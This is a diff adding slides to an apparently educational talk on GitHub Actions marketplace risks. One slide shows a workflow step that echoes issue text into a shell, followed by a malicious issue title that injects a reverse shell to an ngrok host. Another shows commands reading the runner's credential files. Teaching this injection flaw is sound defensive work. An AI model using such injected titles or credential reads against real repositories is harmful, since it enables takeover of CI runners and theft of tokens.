@@ -11,6 +11,7 @@ ex paid : https://github.com/marketplace/wip
 * only apps owned by organizations can sell their app
 
 ##==##
+<!-- .slide: -->
 
 # How to use
 
@@ -23,6 +24,7 @@ ex paid : https://github.com/marketplace/wip
 Notes: Demo direct sur la marketplace
 
 ##==##
+<!-- .slide: class="with-code" -->
 
 # Use an GitHub Action from the marketplace
 
@@ -57,21 +59,69 @@ steps:
 ```
 
 ##==##
-
-//TODO
+<!-- .slide: -->
 
 # Risk
 
-* Github action can read all context variables (secre)
 * Credential stealing
   * Opportunistic
   * Intentional
 * Any maintainer can update a branch or a tag
+* Runner credential stealing 
 
 Notes:
 Opportunistic - sensitive information is accidentally output to the log and an attacker finds it and uses it
 Intentional - an attacker is able to insert a program into your workflow that steals credentials and sends them to the attacker
 Use SHA-1 instead of version
+
+##==##
+<!-- .slide: class="with-code" -->
+
+# Example
+
+* step of our Github Actions
+
+```yaml
+      - run: |
+         echo "ISSUE TITLE: ${{github.event.issue.title}}"
+         echo "ISSUE DESCRIPTION: ${{github.event.issue.body}}"
+```
+
+* Simple issue name that trigger our Action
+```yaml
+New malicious issue title" && bash -i >& /dev/tcp/8.tcp.ngrok.io/15063 0>&1 && echo "
+```
+
+Notes:
+
+ngrok to make a backdoor
+
+##==##
+<!-- .slide: class="with-code" -->
+
+* Credential 
+
+```yaml
+$ cat /home/runner/runners/2.287.1/.credentials
+{"data":{"token":"REDACTED"},"scheme":"OAuthAccessToken"}
+```
+
+* Runner's data 
+
+```yaml
+$ cat /home/runner/runners/2.287.1/.runner
+{
+  "AgentId": "1",
+  "AgentName": "Hosted Agent",
+  "PoolId": "2",
+  "ServerUrl": "https://pipelines.actions.githubusercontent.com/REDACTED/",
+  "SkipSessionRecover": "True",
+  "IsHostedServer": "True",
+  "workFolder": "_work",
+  "WorkFolder": "/home/runner/work",
+  "MonitorSocketAddress": "127.0.0.1:49100"
+}
+```
 
 ##==##
 <!-- .slide: -->
